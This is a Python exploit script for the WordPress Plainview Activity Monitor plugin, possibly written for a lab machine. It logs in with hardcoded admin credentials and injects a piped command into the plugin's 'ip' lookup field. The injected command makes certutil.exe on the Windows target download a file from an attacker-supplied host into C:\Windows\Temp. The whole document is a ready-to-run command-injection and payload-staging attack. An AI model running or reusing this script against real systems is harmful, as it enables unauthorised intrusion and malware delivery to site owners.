#!/usr/bin/env python3
import requests
import sys

def main():
    target_ip = sys.argv[1]
    source_ip = sys.argv[2]

    file_to_dl = sys.argv[3]

    wp_login = 'http://' + target_ip + '/wordpress/wp-login.php'
    wp_admin = 'http://' + target_ip + '/wordpress/wp-admin/'

    username = 'wpadmin'
    password = 'wppassword1'

    with requests.Session() as s:
        headers_iv = { 'Cookie':'wordpress_test_cookie=WP Cookie check' }
        data_iv = {
            'log':username, 'pwd':password, 'wp-submit':'Log In', 'redirect_to':wp_admin, 'testcookie':'1'
        }
        s.post(wp_login, headers=headers_iv, data=data_iv)

        plainview = wp_admin + 'admin.php?page=plainview_activity_monitor&tab=activity_tools'
        
        data_stage = (
           ('ip', (None, 't.co|certutil.exe -urlcache -f http://' + source_ip + ':8000/' + file_to_dl + ' C:\\Windows\\Temp\\' + file_to_dl)),
           ('lookup', (None, 'Lookup'))
        )
        print("Attempting to upload %s using Plainview Activity Monitor..." % file_to_dl, end="")
        s.post(plainview, files=data_stage)
        print("success!")

if __name__ == "__main__":
    if (len(sys.argv) != 4):
        print("Usage: python3 %s <target IP> <source IP> <file>" % sys.argv[0])
        sys.exit(0)
    else:
        main()
